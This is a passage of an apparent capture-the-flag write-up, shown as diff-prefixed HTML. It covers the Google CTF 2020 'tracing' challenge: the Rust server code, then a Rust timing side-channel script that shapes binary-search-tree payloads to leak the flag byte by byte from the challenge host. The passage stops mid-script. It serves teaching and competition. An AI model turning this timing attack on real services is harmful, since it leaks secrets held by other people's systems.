+</span><span style="color:#73d0ff;">env_logger </span><span>= </span><span style="color:#bae67e;">&quot;0.7.1&quot;
+</span><span style="color:#73d0ff;">futures </span><span>= </span><span style="color:#bae67e;">&quot;0.3.5&quot;
+</span><span style="color:#73d0ff;">uuid </span><span>= </span><span style="color:#bae67e;">&quot;0.8.1&quot;
+</span><span>
+</span><span>[</span><span style="color:#73d0ff;">dependencies</span><span style="color:#ccc9c2cc;">.</span><span style="color:#73d0ff;">async-std</span><span>]
+</span><span style="color:#73d0ff;">version </span><span>= </span><span style="color:#bae67e;">&quot;1.6.1&quot;
+</span><span style="color:#73d0ff;">features </span><span>= [</span><span style="color:#bae67e;">&quot;attributes&quot;</span><span>]
+</span></code></pre>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>❯ grep -r &quot;unsafe&quot; .
+</span></code></pre>
+<p>A quick grep shows that there are no unsafe keywords which means we are likely looking at a logic error.</p>
+<pre data-lang="rust" style="background-color:#212733;color:#ccc9c2;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#ffa759;">use </span><span>async_std</span><span style="color:#f29e74;">::</span><span>net</span><span style="color:#f29e74;">::</span><span>{TcpListener</span><span style="color:#ccc9c2cc;">,</span><span> TcpStream}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>async_std</span><span style="color:#f29e74;">::</span><span>prelude</span><span style="color:#f29e74;">::*</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>log</span><span style="color:#f29e74;">::</span><span>{debug</span><span style="color:#ccc9c2cc;">,</span><span> warn}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>pwn_tracing</span><span style="color:#f29e74;">::</span><span>bst</span><span style="color:#f29e74;">::</span><span>BinarySearchTree</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>uuid</span><span style="color:#f29e74;">::</span><span>Uuid</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#ffa759;">const </span><span style="color:#ffcc66;">BIND_ADDR</span><span style="color:#ccc9c2cc;">: </span><span style="color:#f29e74;">&amp;</span><span style="color:#ffa759;">str </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;0.0.0.0:1337&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>async </span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">accept</span><span>(</span><span style="color:#ffa759;">mut </span><span style="color:#ffcc66;">stream</span><span style="color:#ccc9c2cc;">:</span><span> TcpStream, </span><span style="color:#ffcc66;">checks</span><span style="color:#ccc9c2cc;">: </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span>&lt;Uuid&gt;) </span><span style="color:#ccc9c2cc;">-&gt; </span><span>std</span><span style="color:#f29e74;">::</span><span>io</span><span style="color:#f29e74;">::</span><span style="font-style:italic;color:#5ccfe6;">Result</span><span>&lt;()&gt; {
+</span><span>    </span><span style="color:#f28779;">debug!</span><span>(</span><span style="color:#bae67e;">&quot;Accepted connection&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let</span><span> bytes </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#f29e74;">&amp;</span><span>stream)</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">bytes</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">map</span><span>(|</span><span style="color:#ffcc66;">b</span><span>| b</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>())</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let</span><span> chunks </span><span style="color:#f29e74;">= </span><span>{
+</span><span>        </span><span style="font-style:italic;color:#5c6773;">// Ugh, async_std::prelude::StreamExt doesn&#39;t have chunks(),
+</span><span>        </span><span style="font-style:italic;color:#5c6773;">// but it conflicts with futures::stream::StreamExt for the methods it
+</span><span>        </span><span style="font-style:italic;color:#5c6773;">// does have.
+</span><span>        </span><span style="color:#ffa759;">use </span><span>futures</span><span style="color:#f29e74;">::</span><span>stream</span><span style="color:#f29e74;">::</span><span>StreamExt</span><span style="color:#ccc9c2cc;">;
+</span><span>        bytes</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">chunks</span><span>(</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>    }</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> count</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffa759;">u32 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let</span><span> ids </span><span style="color:#f29e74;">=</span><span> chunks</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">filter_map</span><span>(|</span><span style="color:#ffcc66;">bytes</span><span>| {
+</span><span>        count </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>        Uuid</span><span style="color:#f29e74;">::</span><span>from_slice(</span><span style="color:#f29e74;">&amp;</span><span>bytes)</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">ok</span><span>()
+</span><span>    })</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let</span><span> tree </span><span style="color:#f29e74;">= </span><span>{
+</span><span>        </span><span style="color:#ffa759;">use </span><span>futures</span><span style="color:#f29e74;">::</span><span>stream</span><span style="color:#f29e74;">::</span><span>StreamExt</span><span style="color:#ccc9c2cc;">;
+</span><span>        ids</span><span style="color:#f29e74;">.</span><span>collect</span><span style="color:#f29e74;">::</span><span>&lt;BinarySearchTree&lt;</span><span style="color:#f29e74;">_</span><span>&gt;&gt;()
+</span><span>    }
+</span><span>    </span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">debug!</span><span>(</span><span style="color:#bae67e;">&quot;Received {} IDs&quot;</span><span style="color:#ccc9c2cc;">,</span><span> count)</span><span style="color:#ccc9c2cc;">;
+</span><span>    stream</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">write_all</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>count</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">to_be_bytes</span><span>())</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#f28779;">debug!</span><span>(</span><span style="color:#bae67e;">&quot;Checking uploaded IDs for any matches&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    checks
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">iter</span><span>()
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">filter</span><span>(|</span><span style="color:#ffcc66;">check</span><span>| tree</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">contains</span><span>(check))
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">for_each</span><span>(|</span><span style="color:#ffcc66;">check</span><span>| </span><span style="color:#f28779;">warn!</span><span>(</span><span style="color:#bae67e;">&quot;Uploaded IDs contain {}!&quot;</span><span style="color:#ccc9c2cc;">,</span><span> check))</span><span style="color:#ccc9c2cc;">;
+</span><span>    stream</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">shutdown</span><span>(std</span><span style="color:#f29e74;">::</span><span>net</span><span style="color:#f29e74;">::</span><span>Shutdown</span><span style="color:#f29e74;">::</span><span>Both)</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">debug!</span><span>(</span><span style="color:#bae67e;">&quot;Done&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="font-style:italic;color:#5ccfe6;">Ok</span><span>(())
+</span><span>}
+</span><span>
+</span><span style="color:#ccc9c2cc;">#</span><span>[</span><span style="color:#ffd580;">async_std</span><span>::</span><span style="color:#ffd580;">main</span><span>]
+</span><span>async </span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">main</span><span>() </span><span style="color:#ccc9c2cc;">-&gt; </span><span>std</span><span style="color:#f29e74;">::</span><span>io</span><span style="color:#f29e74;">::</span><span style="font-style:italic;color:#5ccfe6;">Result</span><span>&lt;()&gt; {
+</span><span>    env_logger</span><span style="color:#f29e74;">::</span><span>init()</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">let</span><span> checks</span><span style="color:#ccc9c2cc;">: </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span>&lt;Uuid&gt; </span><span style="color:#f29e74;">= </span><span>std</span><span style="color:#f29e74;">::</span><span>env</span><span style="color:#f29e74;">::</span><span>args()
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">skip</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">map</span><span>(|</span><span style="color:#ffcc66;">arg</span><span>| Uuid</span><span style="color:#f29e74;">::</span><span>from_slice(arg</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">as_bytes</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>())
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">collect</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#f28779;">debug!</span><span>(</span><span style="color:#bae67e;">&quot;Loaded checks: {:?}&quot;</span><span style="color:#ccc9c2cc;">,</span><span> checks)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">let</span><span> listener </span><span style="color:#f29e74;">= </span><span>TcpListener</span><span style="color:#f29e74;">::</span><span>bind(</span><span style="color:#ffcc66;">BIND_ADDR</span><span>)</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> incoming </span><span style="color:#f29e74;">=</span><span> listener</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">incoming</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">while let </span><span style="font-style:italic;color:#5ccfe6;">Some</span><span>(stream) </span><span style="color:#f29e74;">=</span><span> incoming</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">next</span><span>()</span><span style="color:#f29e74;">.</span><span>await {
+</span><span>        </span><span style="color:#ffa759;">let</span><span> stream </span><span style="color:#f29e74;">=</span><span> stream</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span>        async_std</span><span style="color:#f29e74;">::</span><span>task</span><span style="color:#f29e74;">::</span><span>spawn(</span><span style="color:#f28779;">accept</span><span>(stream</span><span style="color:#ccc9c2cc;">,</span><span> checks</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">clone</span><span>()))</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="font-style:italic;color:#5ccfe6;">Ok</span><span>(())
+</span><span>}
+</span></code></pre>
+<p>To summarize:</p>
+<ol>
+<li>Load arguments as stored UUIDs</li>
+<li>Start up TCP server</li>
+<li>Read input from a connection, split it into 16 byte chunks, and map it into UUIDs</li>
+<li>Write the number of received UUIDs back to the client</li>
+<li>Construct a binary search tree from the received UUIDs</li>
+<li>Check if the arg UUIDs are in that binary tree and if so say something in the log</li>
+<li>Close the connection</li>
+</ol>
+<p>We get very little data back from the server.  From the note provided with the challenge it seems likely that our flag is stored in the arg UUIDs but we don't have any obvious ways to extract that because we don't get feedback based on how the binary search works out.</p>
+<h2 id="attack-overview">attack overview</h2>
+<p>We realized that we although we couldn't get any feedback directly, we could perform a timing attack.  By constructing a binary tree such that uuids lower than the node hit the end of the tree immediately and uuids higher have to traverse a long tail we can leak which direction the character is in.  By performing a binary search (heh) we can narrow this down to the exact byte in 8 connections.  This can be done for everything except the last two characters because of how we created the payload.  Fortunately, we know that the last character in the flag is a closing bracket and the 2nd to last character was obvious from context.</p>
+<pre data-lang="rust" style="background-color:#212733;color:#ccc9c2;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#ffa759;">use </span><span>itertools</span><span style="color:#f29e74;">::</span><span>Itertools</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>std</span><span style="color:#f29e74;">::</span><span>cmp</span><span style="color:#f29e74;">::</span><span>Ordering</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>std</span><span style="color:#f29e74;">::</span><span>cmp</span><span style="color:#f29e74;">::</span><span>Ordering</span><span style="color:#f29e74;">::</span><span>{Equal</span><span style="color:#ccc9c2cc;">,</span><span> Greater</span><span style="color:#ccc9c2cc;">,</span><span> Less}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>std</span><span style="color:#f29e74;">::</span><span>error</span><span style="color:#f29e74;">::</span><span>Error</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>std</span><span style="color:#f29e74;">::</span><span>iter</span><span style="color:#f29e74;">::</span><span>Iterator</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>std</span><span style="color:#f29e74;">::</span><span>time</span><span style="color:#f29e74;">::</span><span>{Duration</span><span style="color:#ccc9c2cc;">,</span><span> Instant}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>tokio</span><span style="color:#f29e74;">::</span><span>io</span><span style="color:#f29e74;">::</span><span>{AsyncReadExt</span><span style="color:#ccc9c2cc;">,</span><span> AsyncWriteExt}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>tokio</span><span style="color:#f29e74;">::</span><span>join</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>tokio</span><span style="color:#f29e74;">::</span><span>net</span><span style="color:#f29e74;">::</span><span>TcpStream</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>tokio</span><span style="color:#f29e74;">::</span><span>time</span><span style="color:#f29e74;">::</span><span>delay_for</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">create_payload</span><span>(</span><span style="color:#ffcc66;">known</span><span style="color:#ccc9c2cc;">: </span><span style="color:#f29e74;">&amp;</span><span>[</span><span style="color:#ffa759;">u8</span><span>], </span><span style="color:#ffcc66;">i</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffa759;">u8</span><span>) </span><span style="color:#ccc9c2cc;">-&gt; </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span>&lt;[</span><span style="color:#ffa759;">u8</span><span style="color:#ccc9c2cc;">; </span><span style="color:#ffcc66;">16</span><span>]&gt; {
+</span><span>    (</span><span style="color:#ffcc66;">0</span><span style="color:#f29e74;">..=</span><span style="color:#ffcc66;">0xff</span><span>)
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">cartesian_product</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#f29e74;">..=</span><span style="color:#ffcc66;">0x2f</span><span>)
+</span><span>        </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">map</span><span>(|(</span><span style="color:#ffcc66;">l</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">r</span><span>)| {
+</span><span>            </span><span style="color:#ffa759;">let mut</span><span> res </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffcc66;">0</span><span style="color:#ffa759;">u8</span><span style="color:#ccc9c2cc;">; </span><span style="color:#ffcc66;">16</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>            res[</span><span style="color:#ffcc66;">0</span><span style="color:#f29e74;">..</span><span>known</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">len</span><span>()]</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">clone_from_slice</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>known[</span><span style="color:#f29e74;">..</span><span>])</span><span style="color:#ccc9c2cc;">;
+</span><span>            res[known</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">len</span><span>()] </span><span style="color:#f29e74;">=</span><span> i</span><span style="color:#ccc9c2cc;">;
+</span><span>            res[known</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">len</span><span>() </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">=</span><span> l</span><span style="color:#ccc9c2cc;">;
+</span><span>            res[known</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">len</span><span>() </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">2</span><span>] </span><span style="color:#f29e74;">=</span><span> r</span><span style="color:#ccc9c2cc;">;
+</span><span>            res
+</span><span>        })
+</span><span>        </span><span style="color:#f29e74;">.</span><span>collect</span><span style="color:#f29e74;">::</span><span>&lt;</span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span>&lt;[</span><span style="color:#ffa759;">u8</span><span style="color:#ccc9c2cc;">; </span><span style="color:#ffcc66;">16</span><span>]&gt;&gt;()
+</span><span>}
+</span><span>
+</span><span>async </span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">attack</span><span>(</span><span style="color:#ffcc66;">entries</span><span style="color:#ccc9c2cc;">: </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span>&lt;[</span><span style="color:#ffa759;">u8</span><span style="color:#ccc9c2cc;">; </span><span style="color:#ffcc66;">16</span><span>]&gt;) </span><span style="color:#ccc9c2cc;">-&gt; </span><span style="font-style:italic;color:#5ccfe6;">Result</span><span>&lt;Duration, </span><span style="font-style:italic;color:#5ccfe6;">Box</span><span>&lt;dyn Error&gt;&gt; {
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> total </span><span style="color:#f29e74;">= </span><span>Duration</span><span style="color:#f29e74;">::</span><span>new(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> tasks </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span style="color:#f29e74;">::</span><span>new()</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">let </span><span style="color:#ffcc66;">NUM_TRIES</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffa759;">u8 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">for </span><span style="color:#f29e74;">_ in </span><span style="color:#ffcc66;">0</span><span style="color:#f29e74;">..</span><span style="color:#ffcc66;">NUM_TRIES </span><span>{
+</span><span>        </span><span style="color:#ffa759;">let</span><span> entries </span><span style="color:#f29e74;">=</span><span> entries</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">clone</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        tasks</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">push</span><span>(tokio</span><span style="color:#f29e74;">::</span><span>spawn(async </span><span style="color:#ffa759;">move </span><span>{
+</span><span>            </span><span style="color:#ffa759;">let </span><span>(</span><span style="color:#ffa759;">mut</span><span> read</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">mut</span><span> write) </span><span style="color:#f29e74;">= </span><span>TcpStream</span><span style="color:#f29e74;">::</span><span>connect(</span><span style="color:#bae67e;">&quot;tracing.2020.ctfcompetition.com:1337&quot;</span><span>)
+</span><span>                </span><span style="font-style:italic;color:#5c6773;">// let (mut read, mut write) = TcpStream::connect(&quot;localhost:1337&quot;)
+</span><span>                </span><span style="color:#f29e74;">.</span><span>await
+</span><span>                </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()
+</span><span>                </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">into_split</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#ffa759;">for</span><span> e </span><span style="color:#f29e74;">in &amp;</span><span>entries {
+</span><span>                write</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">write_all</span><span>(e)</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>            }
+</span><span>
+</span><span>            </span><span style="color:#ffa759;">let mut</span><span> resp </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">Vec</span><span style="color:#f29e74;">::</span><span>new()</span><span style="color:#ccc9c2cc;">;
+</span><span>            write</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">flush</span><span>()</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#f28779;">delay_for</span><span>(Duration</span><span style="color:#f29e74;">::</span><span>new(</span><span style="color:#ffcc66;">10</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>))</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#ccc9c2cc;">;
+</span><span>            write</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">shutdown</span><span>()</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#ffa759;">let mut</span><span> buf </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">; </span><span style="color:#ffcc66;">4</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>            read</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">read</span><span>(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ffa759;">mut</span><span> buf)</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#ffa759;">let</span><span> start </span><span style="color:#f29e74;">= </span><span>Instant</span><span style="color:#f29e74;">::</span><span>now()</span><span style="color:#ccc9c2cc;">;
+</span><span>            read</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">read_to_end</span><span>(</span><span style="color:#f29e74;">&amp;</span><span style="color:#ffa759;">mut</span><span> resp)</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#ffa759;">let</span><span> elapsed </span><span style="color:#f29e74;">=</span><span> start</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">elapsed</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>
+</span><span>            </span><span style="color:#f28779;">assert_eq!</span><span>(entries</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">len</span><span>() </span><span style="color:#f29e74;">as </span><span style="color:#ffa759;">u32</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">u32</span><span style="color:#f29e74;">::</span><span>from_be_bytes(buf))</span><span style="color:#ccc9c2cc;">;
+</span><span>            elapsed
+</span><span>        }))</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">for</span><span> task </span><span style="color:#f29e74;">in</span><span> tasks {
+</span><span>        total </span><span style="color:#f29e74;">+=</span><span> task</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#f29e74;">?</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5ccfe6;">Ok</span><span>(total </span><span style="color:#f29e74;">/ </span><span style="color:#ffcc66;">NUM_TRIES </span><span style="color:#f29e74;">as </span><span style="color:#ffa759;">u32</span><span>)
+</span><span>}
+</span><span>
+</span><span>async </span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">discover_next</span><span>(</span><span style="color:#ffcc66;">known</span><span style="color:#ccc9c2cc;">: </span><span style="color:#f29e74;">&amp;</span><span>[</span><span style="color:#ffa759;">u8</span><span>]) </span><span style="color:#ccc9c2cc;">-&gt; </span><span style="font-style:italic;color:#5ccfe6;">Result</span><span>&lt;</span><span style="color:#ffa759;">u8</span><span>, </span><span style="font-style:italic;color:#5ccfe6;">Box</span><span>&lt;dyn Error&gt;&gt; {
+</span><span>    </span><span style="color:#ffa759;">let</span><span> time_low </span><span style="color:#f29e74;">= </span><span>Duration</span><span style="color:#f29e74;">::</span><span>from_millis(</span><span style="color:#ffcc66;">10</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> first </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> it </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> step </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let mut</span><span> count </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">255</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">while</span><span> count </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0 </span><span>{
+</span><span>        it </span><span style="color:#f29e74;">=</span><span> first</span><span style="color:#ccc9c2cc;">;
+</span><span>        step </span><span style="color:#f29e74;">=</span><span> count </span><span style="color:#f29e74;">/ </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">;
+</span><span>        it </span><span style="color:#f29e74;">+=</span><span> step</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">let</span><span> duration </span><span style="color:#f29e74;">= </span><span>{
+</span><span>            </span><span style="color:#ffa759;">let mut</span><span> curr </span><span style="color:#f29e74;">= </span><span>Duration</span><span style="color:#f29e74;">::</span><span>from_millis(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>            </span><span style="color:#ffa759;">loop </span><span>{
+</span><span>                </span><span style="color:#ffa759;">let</span><span> temp </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">attack</span><span>(</span><span style="color:#f28779;">create_payload</span><span>(known</span><span style="color:#ccc9c2cc;">,</span><span> it))</span><span style="color:#f29e74;">.</span><span>await</span><span style="color:#ccc9c2cc;">;
+</span><span>                </span><span style="color:#ffa759;">if</span><span> temp</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">is_ok</span><span>() {
+</span><span>                    curr </span><span style="color:#f29e74;">=</span><span> temp</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>                }
+</span><span>            }
+</span><span>            curr
+</span><span>        }</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">if</span><span> duration </span><span style="color:#f29e74;">&gt;</span><span> time_low {
+</span><span>            it </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>            first </span><span style="color:#f29e74;">=</span><span> it</span><span style="color:#ccc9c2cc;">;
+</span><span>            count </span><span style="color:#f29e74;">-=</span><span> step </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1
+</span><span>        } </span><span style="color:#ffa759;">else </span><span>{
+</span><span>            count </span><span style="color:#f29e74;">=</span><span> step</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#f28779;">println!</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> - </span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;"> - </span><span style="color:#ffcc66;">{:?}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> it</span><span style="color:#ccc9c2cc;">,</span><span> step</span><span style="color:#ccc9c2cc;">,</span><span> duration)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    it </span><span style="color:#f29e74;">-= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="font-style:italic;color:#5ccfe6;">Ok</span><span>(it)
+</span><span>}
+</span><span>
+</span><span style="color:#ccc9c2cc;">#</span><span>[</span><span style="color:#ffd580;">tokio</span><span>::</span><span style="color:#ffd580;">main</span><span>]
+</span><span>async </span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">main</span><span>() </span><span style="color:#ccc9c2cc;">-&gt; </span><span style="font-style:italic;color:#5ccfe6;">Result</span><span>&lt;(), </span><span style="font-style:italic;color:#5ccfe6;">Box</span><span>&lt;dyn Error&gt;&gt; {
